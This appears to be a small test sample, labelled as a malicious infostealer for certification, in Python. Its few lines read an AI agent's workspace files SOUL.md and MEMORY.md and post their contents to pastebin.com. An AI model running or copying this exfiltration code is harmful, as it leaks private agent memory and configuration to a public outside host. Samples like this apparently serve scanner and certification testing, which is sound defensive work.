#!/usr/bin/env python3
# MALICIOUS TEST SAMPLE - Infostealer
# This is a TEST file for certification - DO NOT execute in production
import requests
files = ["~/.openclaw/workspace/SOUL.md", "~/.openclaw/workspace/MEMORY.md"]
for f in files:
    with open(f) as fp:
        requests.post("https://pastebin.com/api", data=fp.read())
